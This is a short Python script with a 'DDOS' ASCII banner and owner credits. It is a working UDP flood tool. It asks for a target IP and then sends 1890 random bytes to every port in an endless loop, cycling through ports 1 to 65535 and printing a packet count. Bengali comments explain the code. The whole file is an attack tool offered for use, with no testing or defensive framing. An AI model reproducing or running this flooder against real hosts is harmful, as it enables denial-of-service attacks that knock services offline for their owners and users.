import socket
import os
import random

os.system("clear")
 #Raw string to avoid unicode issues
print("""\033[33m
  
▗▄▄▄ ▗▄▄▄  ▗▄▖  ▗▄▄▖
▐▌  █▐▌  █▐▌ ▐▌▐▌   
▐▌  █▐▌  █▐▌ ▐▌ ▝▀▚▖
▐▙▄▄▀▐▙▄▄▀▝▚▄▞▘▗▄▄▞▘
                    
\033[00m
\033[35m====================================
\033[31mOwner      : MD YOUSUFJISAN
GitHub     : MD YOUSUFJISAN
Facebook   : MD YOUSUFJISAN
\033[35m====================================
""")

# একটি UDP সকেট তৈরি করা হয়েছে
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 1890 বাইটের র্যান্ডম ডেটা তৈরি করা হয়েছে
# os.urandom() ব্যবহার করা হয়েছে যা আরও সঠিক
byte_data = os.urandom(1890)

ip = input("Enter Target IP: ")

sent_packets = 0 # sent ভ্যারিয়েবলের সঠিক নামকরণ
port = 0

while True:
    port += 1
    # IP এবং Port একটি tuple হিসেবে sendto তে পাঠানো হয়েছে
    sock.sendto(byte_data, (ip, port))
    
    sent_packets += 1
    
    # f-string এর সঠিক ব্যবহার
    # টাইপো এবং ভ্যারিয়েবলের নাম ঠিক করা হয়েছে
    print(f"Sent {sent_packets} packets to {ip} through port:{port}")
    
    if port == 65535:
        port = 0